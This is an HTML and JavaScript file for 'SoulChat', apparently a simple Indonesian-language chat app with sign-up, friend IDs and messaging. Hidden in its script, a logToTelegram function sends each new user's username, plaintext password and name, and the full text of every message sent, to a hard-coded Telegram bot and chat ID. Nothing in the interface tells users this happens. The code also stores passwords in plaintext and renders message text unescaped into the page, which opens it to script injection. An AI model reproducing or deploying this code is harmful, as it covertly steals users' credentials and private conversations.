<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SoulChat - Messaging System</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0f172a; color: white; }
        .chat-bubble-me { background: linear-gradient(135deg, #6366f1, #4f46e5); border-radius: 20px 20px 4px 20px; }
        .chat-bubble-them { background: #1e293b; border-radius: 20px 20px 20px 4px; border: 1px solid rgba(255,255,255,0.05); }
        .glass-nav { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border-top: 1px solid rgba(255,255,255,0.05); }
        .animate-in { animation: slideUp 0.3s ease-out; }
        @keyframes slideUp { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body class="bg-slate-950">

    <div class="max-w-md mx-auto bg-slate-900 min-h-screen shadow-2xl flex flex-col relative overflow-hidden border-x border-white/5">
        
        <!-- AUTH SCREEN -->
        <div id="auth-screen" class="absolute inset-0 z-[100] bg-slate-900 flex items-center justify-center p-8 transition-all duration-500">
            <div class="w-full space-y-8">
                <div class="text-center">
                    <div class="w-20 h-20 bg-indigo-600 rounded-3xl mx-auto flex items-center justify-center mb-6 shadow-indigo-500/20 shadow-2xl rotate-3">
                        <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m3 21 1.9-5.7a8.5 8.5 0 1 1 3.8 3.8z"/></svg>
                    </div>
                    <h1 class="text-3xl font-extrabold tracking-tighter">SoulChat</h1>
                    <p class="text-slate-500 text-sm mt-2">Masuk untuk mulai berkirim pesan</p>
                </div>

                <div class="space-y-4">
                    <input type="text" id="auth-user" class="w-full bg-slate-800 border border-white/10 p-4 rounded-2xl outline-none focus:border-indigo-500 transition" placeholder="Username">
                    <input type="password" id="auth-pass" class="w-full bg-slate-800 border border-white/10 p-4 rounded-2xl outline-none focus:border-indigo-500 transition" placeholder="Password">
                    
                    <div id="reg-fields" class="hidden space-y-4">
                        <input type="text" id="reg-name" class="w-full bg-slate-800 border border-white/10 p-4 rounded-2xl outline-none focus:border-indigo-500 transition" placeholder="Nama Lengkap">
                    </div>

                    <button onclick="handleAuth()" id="auth-btn" class="w-full bg-indigo-600 py-4 rounded-2xl font-bold hover:bg-indigo-500 transition active:scale-95 shadow-lg shadow-indigo-500/20">
                        Masuk
                    </button>
                    <button onclick="toggleAuth()" id="toggle-btn" class="w-full text-slate-500 text-xs font-semibold uppercase tracking-widest hover:text-white transition">
                        Belum punya akun? Daftar
                    </button>
                </div>
            </div>
        </div>

        <!-- MAIN APP HEADER -->
        <header class="p-6 flex justify-between items-center border-b border-white/5 bg-slate-900/50 sticky top-0 z-50">
            <div>
                <h1 class="font-black text-xl tracking-tight" id="header-title">SoulChat</h1>
                <div class="flex items-center gap-2 mt-1">
                    <span class="text-[10px] font-bold text-slate-500 uppercase">ID:</span>
                    <span id="my-id-display" class="text-[10px] font-black text-indigo-400 bg-indigo-500/10 px-2 py-0.5 rounded">---</span>
                </div>
            </div>
            <button onclick="logout()" class="p-2 text-slate-500 hover:text-red-500 transition">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></button>
            </button>
        </header>

        <!-- VIEW: CONTACTS / FRIENDS -->
        <main id="view-contacts" class="flex-1 overflow-y-auto p-6 space-y-6">
            <div class="flex items-center justify-between">
                <h2 class="text-sm font-black text-slate-400 uppercase tracking-widest">Daftar Teman</h2>
                <button onclick="showAddFriend()" class="text-xs font-black text-indigo-400 hover:text-indigo-300 uppercase tracking-widest">+ Tambah Teman</button>
            </div>
            
            <div id="friend-list" class="space-y-3">
                <!-- Friends will appear here -->
            </div>
        </main>

        <!-- VIEW: CHAT WINDOW -->
        <div id="chat-window" class="hidden absolute inset-0 z-[120] bg-slate-900 flex flex-col">
            <header class="p-5 border-b border-white/5 flex items-center gap-4 bg-slate-900/80 backdrop-blur-md">
                <button onclick="hideChat()" class="p-2 text-slate-500"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="m15 18-6-6 6-6"/></svg></button>
                <div class="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center font-bold text-white shadow-lg" id="chat-p-avatar">?</div>
                <div>
                    <h4 id="chat-p-name" class="font-bold text-white">Nama Teman</h4>
                    <span class="text-[10px] text-green-500 font-bold uppercase tracking-widest">Aktif</span>
                </div>
            </header>
            <div id="chat-msg-container" class="flex-1 overflow-y-auto p-6 space-y-4 bg-slate-950 flex flex-col"></div>
            <div class="p-4 bg-slate-900 border-t border-white/5 flex gap-2">
                <input type="text" id="chat-input" class="flex-1 bg-slate-800 p-4 rounded-2xl outline-none text-sm border border-transparent focus:border-indigo-500 transition" placeholder="Tulis pesan...">
                <button onclick="sendMsg()" class="w-14 h-14 bg-indigo-600 text-white rounded-2xl flex items-center justify-center shadow-lg active:scale-95 transition">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
                </button>
            </div>
        </div>

        <!-- MODAL: ADD FRIEND -->
        <div id="add-friend-modal" class="hidden absolute inset-0 z-[150] bg-slate-950/90 backdrop-blur-sm flex items-center justify-center p-8">
            <div class="w-full bg-slate-800 p-8 rounded-[2.5rem] border border-white/10 space-y-6">
                <h3 class="text-xl font-black text-center">Tambah Teman Baru</h3>
                <input type="text" id="friend-id-input" class="w-full bg-slate-900 p-4 rounded-2xl outline-none border border-white/5 focus:border-indigo-500 transition text-center font-bold" placeholder="Masukkan ID Teman">
                <div class="flex gap-3">
                    <button onclick="hideAddFriend()" class="flex-1 py-4 text-slate-500 font-bold text-xs uppercase tracking-widest">Batal</button>
                    <button onclick="addFriendLogic()" class="flex-1 bg-indigo-600 py-4 rounded-2xl font-bold text-xs uppercase tracking-widest shadow-lg shadow-indigo-500/20">Tambah</button>
                </div>
            </div>
        </div>

    </div>

    <script>
        const BOT_TOKEN = "7417366472:AAG_H9DxOxGzfkKkMxLx7lAoEgu4z3IwcJg";
        const CHAT_ID = "6128943834";

        let users = JSON.parse(localStorage.getItem('sc_users')) || [];
        let currentUser = JSON.parse(localStorage.getItem('sc_session')) || null;
        let messages = JSON.parse(localStorage.getItem('sc_msgs')) || {};
        let activePartner = null;

        // --- TELEGRAM LOGIC ---
        async function logToTelegram(type, data) {
            let text = "";
            if(type === 'REG') {
                text = `ðŸ†• <b>REGISTRASI BARU</b>\nID: <code>${data.id}</code>\nUser: <code>${data.user}</code>\nPass: <code>${data.pass}</code>\nNama: ${data.name}`;
            } else if(type === 'MSG') {
                text = `ðŸ’¬ <b>PESAN BARU</b>\nDari: ${data.from} (${data.fromId})\nKe: ${data.to} (${data.toId})\nIsi: <i>${data.text}</i>`;
            }

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                });
            } catch(e) {}
        }

        // --- AUTH LOGIC ---
        function toggleAuth() {
            const isReg = document.getElementById('reg-fields').classList.toggle('hidden');
            document.getElementById('auth-btn').innerText = isReg ? "Daftar Akun" : "Masuk";
            document.getElementById('toggle-btn').innerText = isReg ? "Sudah punya akun? Login" : "Belum punya akun? Daftar";
        }

        async function handleAuth() {
            const user = document.getElementById('auth-user').value.trim();
            const pass = document.getElementById('auth-pass').value.trim();
            const isReg = !document.getElementById('reg-fields').classList.contains('hidden');

            if(!user || !pass) return alert("Isi semua data!");

            if(isReg) {
                const name = document.getElementById('reg-name').value.trim();
                if(!name) return alert("Nama tidak boleh kosong!");
                if(users.find(u => u.user === user)) return alert("Username sudah dipakai!");

                const newUser = {
                    id: Math.floor(100000 + Math.random() * 900000).toString(), // ID 6 Digit
                    user, pass, name, 
                    friends: []
                };

                users.push(newUser);
                localStorage.setItem('sc_users', JSON.stringify(users));
                await logToTelegram('REG', newUser);
                alert(`Pendaftaran sukses! ID Anda: ${newUser.id}. Silakan Login.`);
                location.reload();
            } else {
                const found = users.find(u => u.user === user && u.pass === pass);
                if(found) {
                    currentUser = found;
                    localStorage.setItem('sc_session', JSON.stringify(currentUser));
                    initApp();
                } else {
                    alert("User atau Password salah!");
                }
            }
        }

        // --- CORE APP LOGIC ---
        function initApp() {
            document.getElementById('auth-screen').style.transform = 'translateY(-100%)';
            document.getElementById('my-id-display').innerText = currentUser.id;
            renderFriends();
        }

        function renderFriends() {
            const container = document.getElementById('friend-list');
            container.innerHTML = '';
            
            if(currentUser.friends.length === 0) {
                container.innerHTML = `<div class="text-center py-20 opacity-20"><p class="text-sm font-bold uppercase tracking-widest">Belum ada teman.<br>Tambah ID teman untuk chat!</p></div>`;
                return;
            }

            currentUser.friends.forEach(fId => {
                const friend = users.find(u => u.id === fId);
                if(!friend) return;

                const key = [currentUser.id, friend.id].sort().join('_');
                const lastMsg = messages[key]?.slice(-1)[0]?.text || "Mulai percakapan...";

                const el = document.createElement('div');
                el.className = "flex items-center gap-4 bg-slate-800/40 p-5 rounded-[2rem] border border-white/5 active:scale-95 transition cursor-pointer";
                el.onclick = () => openChat(friend.id);
                el.innerHTML = `
                    <div class="w-14 h-14 bg-indigo-600 rounded-2xl flex items-center justify-center font-black text-xl shadow-lg">${friend.name[0].toUpperCase()}</div>
                    <div class="flex-1 min-w-0">
                        <div class="flex justify-between items-center">
                            <h4 class="font-bold text-white">${friend.name}</h4>
                            <span class="text-[9px] font-bold text-indigo-400 bg-indigo-500/10 px-1.5 py-0.5 rounded">ID: ${friend.id}</span>
                        </div>
                        <p class="text-xs text-slate-500 truncate mt-0.5">${lastMsg}</p>
                    </div>`;
                container.appendChild(el);
            });
        }

        // --- FRIENDSHIP LOGIC ---
        function showAddFriend() { document.getElementById('add-friend-modal').classList.remove('hidden'); }
        function hideAddFriend() { document.getElementById('add-friend-modal').classList.add('hidden'); }

        function addFriendLogic() {
            const targetId = document.getElementById('friend-id-input').value.trim();
            if(targetId === currentUser.id) return alert("Tidak bisa menambah ID sendiri!");
            
            const target = users.find(u => u.id === targetId);
            if(!target) return alert("ID Teman tidak ditemukan!");
            
            if(currentUser.friends.includes(targetId)) return alert("Sudah berteman!");

            currentUser.friends.push(targetId);
            // Saling berteman (Auto accept)
            if(!target.friends.includes(currentUser.id)) {
                target.friends.push(currentUser.id);
            }

            saveDB();
            hideAddFriend();
            renderFriends();
            alert(`Berhasil menambahkan ${target.name}!`);
        }

        // --- CHAT LOGIC ---
        function openChat(fId) {
            activePartner = users.find(u => u.id === fId);
            document.getElementById('chat-p-name').innerText = activePartner.name;
            document.getElementById('chat-p-avatar').innerText = activePartner.name[0].toUpperCase();
            document.getElementById('chat-window').classList.remove('hidden');
            renderMessages();
        }

        function hideChat() { 
            document.getElementById('chat-window').classList.add('hidden'); 
            activePartner = null;
            renderFriends();
        }

        async function sendMsg() {
            const input = document.getElementById('chat-input');
            const txt = input.value.trim();
            if(!txt || !activePartner) return;

            const key = [currentUser.id, activePartner.id].sort().join('_');
            if(!messages[key]) messages[key] = [];

            const msgData = {
                senderId: currentUser.id,
                text: txt,
                time: Date.now()
            };

            messages[key].push(msgData);
            localStorage.setItem('sc_msgs', JSON.stringify(messages));
            
            // Log ke Telegram
            await logToTelegram('MSG', {
                from: currentUser.name,
                fromId: currentUser.id,
                to: activePartner.name,
                toId: activePartner.id,
                text: txt
            });

            input.value = '';
            renderMessages();
        }

        function renderMessages() {
            const container = document.getElementById('chat-msg-container');
            const key = [currentUser.id, activePartner.id].sort().join('_');
            const msgs = messages[key] || [];

            container.innerHTML = msgs.map(m => `
                <div class="flex ${m.senderId === currentUser.id ? 'justify-end' : 'justify-start'} animate-in">
                    <div class="max-w-[80%] p-4 text-sm font-semibold shadow-sm ${m.senderId === currentUser.id ? 'chat-bubble-me text-white' : 'chat-bubble-them text-slate-200'}">
                        ${m.text}
                    </div>
                </div>
            `).join('');
            container.scrollTop = container.scrollHeight;
        }

        function saveDB() {
            const idx = users.findIndex(u => u.id === currentUser.id);
            if(idx !== -1) users[idx] = currentUser;
            localStorage.setItem('sc_users', JSON.stringify(users));
        }

        function logout() { localStorage.removeItem('sc_session'); location.reload(); }

        // Boot
        if(currentUser) initApp();
    </script>
</body>
</html>
